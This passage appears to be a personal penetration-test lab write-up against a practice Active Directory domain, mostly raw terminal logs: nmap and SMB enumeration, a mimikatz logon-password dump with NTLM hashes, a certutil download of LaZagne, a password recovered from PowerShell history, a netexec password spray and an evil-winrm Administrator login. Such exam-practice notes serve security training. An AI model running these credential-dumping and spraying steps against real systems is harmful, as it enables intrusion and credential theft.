Open 10.10.135.152:49674
Open 10.10.135.152:49675
Open 10.10.135.152:49691
Open 10.10.135.152:50585

```

### nmap

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.10.180.152  -oN serviceScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-02 12:57 HKT
Nmap scan report for 10.10.180.152
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-07-01T12:33:49
|_Not valid after:  2036-06-29T12:33:49
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-07-02T12:59:08+00:00; +8h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
52956/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:a0:3f:9d (unknown)
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2026-07-02T12:58:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.84 seconds

```

### DNS

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $nxc smb 10.10.180.152    --generate-hosts-file  hosts && cat hosts
SMB         10.10.180.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
192.168.135.153     MS01.oscp.exam MS01
10.10.180.152     DC01.oscp.exam oscp.exam DC01

```

### smb

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $ netexec smb 10.10.180.152   -u 'guest' -p '' --shares 
SMB         10.10.180.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.180.152   445    DC01             [-] oscp.exam\guest: STATUS_ACCOUNT_DISABLED 

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $netexec smb 10.10.180.152   -u '' -p '' --shares 
SMB         10.10.180.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.180.152   445    DC01             [+] oscp.exam\: 
SMB         10.10.180.152   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### mimikatz

```
administrator@MS01 C:\ProgramData>type  pssword.txt 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1937127 (00000000:001d8ee7)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/2/2026 6:20:59 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MS01
         * NTLM     : 3c4495bbd678fac8c9d218be4f2bbc7b
         * SHA1     : 90afa30798b082c0d0aae85435421502c254d459
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1936289 (00000000:001d8ba1)
Session           : Service from 0
User Name         : sshd_748
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 7/2/2026 6:20:51 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-748
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1271676 (00000000:0013677c)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/2/2026 5:49:35 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MS01
         * NTLM     : 3c4495bbd678fac8c9d218be4f2bbc7b
         * SHA1     : 90afa30798b082c0d0aae85435421502c254d459
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1268833 (00000000:00135c61)
Session           : Service from 0
User Name         : sshd_1788
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 7/2/2026 5:49:20 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-1788
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 280146 (00000000:00044652)
Session           : Batch from 0
User Name         : cloudbase-init
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/2/2026 5:35:28 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1004
        msv :
         [00000003] Primary
         * Username : cloudbase-init
         * Domain   : MS01
         * NTLM     : f254d97055e45ab5dbfb507c33781d72
         * SHA1     : 3cd34d13257e5447e9db3ccb6a64a112e5b86387
        tspkg :
        wdigest :
         * Username : cloudbase-init
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : cloudbase-init
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/2/2026 5:35:00 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 117903 (00000000:0001cc8f)
Session           : Service from 0
User Name         : cloudbase-init
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/2/2026 5:34:59 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1004
        msv :
         [00000003] Primary
         * Username : cloudbase-init
         * Domain   : MS01
         * NTLM     : f254d97055e45ab5dbfb507c33781d72
         * SHA1     : 3cd34d13257e5447e9db3ccb6a64a112e5b86387
        tspkg :
        wdigest :
         * Username : cloudbase-init
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : cloudbase-init
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 68909 (00000000:00010d2d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 68880 (00000000:00010d10)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 37823 (00000000:000093bf)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 37745 (00000000:00009371)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : oscp.exam
         * Password : 47 13 3d 18 1c 9d c8 50 79 da 8c f3 a7 1a fc 51 f2 dc f9 df 40 2f 9b 2f e
9 ec e5 4f 56 17 52 86 ac f1 9a 10 ab 30 35 8b a5 a2 c5 4b 05 d6 e3 a4 1c fb 66 35 c5 99 dc df 
ac dd ee ab 05 6e ac 79 68 f8 5c bb cf 74 87 2b e0 34 3f 4e 29 69 80 f7 56 d2 bf 85 e2 74 04 ec
 05 53 2f 00 7d 98 4a 48 43 d0 53 24 fb b2 95 ec 62 87 00 5a ee 6f 79 2f 91 10 85 6f 11 9d 90 a
c 89 0f 23 ae 91 b1 cc 42 79 06 e5 77 f4 04 f0 4f be d7 6c d1 d9 84 94 3d b2 81 2e 92 84 04 be 
04 9e a2 07 bc f3 db c2 3e 50 06 c2 fa 22 15 d8 43 87 18 e5 c7 95 f5 ef e8 ad 00 bf 1d e6 bf f0
 cc 9b 8c f2 fc 52 96 fb c4 a3 cc ef 50 1e b6 5d ee 3a f0 cd 67 32 51 20 88 0e 8f 3f 88 55 51 1
7 07 0c c1 8a ba f0 0f 8d 13 c3 6a b3 86 50 77 d6 11 36 69 18 66 b5 1d a1 73
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 35476 (00000000:00008a94)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               :
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : OSCP
         * NTLM     : fc7c8431a3fa6d042828a5d1b49fe1ab
         * SHA1     : bda2c20764bbab5e649037fdc096f161e3fcd880
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/2/2026 5:34:57 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!

```

### LaZagne

Checked powershell history and found the information that appeared to be password

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC/x64]
└──╼ $wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
--2026-07-02 13:44:03--  https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

```

```
administrator@MS01 C:\Users\Administrator>certutil -urlcache -split -f http://192.168.45.161:8082/LaZagne.exe C:\P
rogramData\LaZagne.exe
****  Online  ****
  000000  ...
  9aaa1d
CertUtil: -URLCache command completed successfully.

```

C:\ProgramData\LaZagne.exe all

### Cred manual check

{{< toggle "Tag 🏷️" >}}

{{< tag "Window-Credential-checklist-manual" >}}  here is the check list to check user 's secret\
{{< /toggle >}}

```
PS C:\Users\Administrator\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type *
```

```
PS C:\Users\Administrator> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\Administrator> C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH
ost_history.txt
PS C:\Users\Administrator> cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\     
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type *
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /r /t 7
(Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
type *
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>

```

use the net user to have the username list

```
cloudbase-init
Administrator
Mary.Williams
Guest
WDAGUtilityAccount
Admin
DefaultAccount
support
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; netexec $proto 10.10.180.154 -u username.txt -p 'hghgib6vHT3bVWf' $auth; done; done

[*] Testing smb ...
SMB         10.10.180.154   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         10.10.180.154   445    MS02             [-] oscp.exam\cloudbase-init:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\Administrator:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\Mary.Williams:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\Guest:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\WDAGUtilityAccount:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\Admin:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\DefaultAccount:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] oscp.exam\support:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 

[*] Testing smb (local-auth)...
SMB         10.10.180.154   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
SMB         10.10.180.154   445    MS02             [-] MS02\cloudbase-init:hghgib6vHT3bVWf STATUS_LOGON_FAILURE 
SMB         10.10.180.154   445    MS02             [-] Error checking if user is admin on 10.10.180.154: The NETBIOS connection with the remote host timed out.
SMB         10.10.180.154   445    MS02             [+] MS02\Administrator:hghgib6vHT3bVWf 

[*] Testing winrm ...
WINRM       10.10.180.154   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\cloudbase-init:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\Administrator:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\Mary.Williams:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\Guest:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\WDAGUtilityAccount:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\Admin:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\DefaultAccount:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [-] oscp.exam\support:hghgib6vHT3bVWf

[*] Testing winrm (local-auth)...
WINRM       10.10.180.154   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
WINRM       10.10.180.154   5985   MS02             [-] MS02\cloudbase-init:hghgib6vHT3bVWf
WINRM       10.10.180.154   5985   MS02             [+] MS02\Administrator:hghgib6vHT3bVWf (Pwn3d!)

[*] Testing wmi ...
RPC         10.10.180.154   135    MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\cloudbase-init:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\Administrator:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\Mary.Williams:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\Guest:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\WDAGUtilityAccount:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\Admin:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\DefaultAccount:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
RPC         10.10.180.154   135    MS02             [-] oscp.exam\support:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)

[*] Testing wmi (local-auth)...
RPC         10.10.180.154   135    MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
RPC         10.10.180.154   135    MS02             [-] MS02\cloudbase-init:hghgib6vHT3bVWf (RPC_S_ACCESS_DENIED)
WMI         10.10.180.154   135    MS02             [+] MS02\Administrator:hghgib6vHT3bVWf (Pwn3d!)

[*] Testing rdp ...

[*] Testing rdp (local-auth)...

[*] Testing ssh ...

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6]
               [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6]
               [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $evil-winrm-py -i 10.10.180.154  -u Administrator  -p hghgib6vHT3bVWf
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.10.180.154:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
ms02\administrator

```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > pssword.txt
Program 'mimikatz.exe' failed to run: Access is deniedAt line:1 char:1
+ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > ...
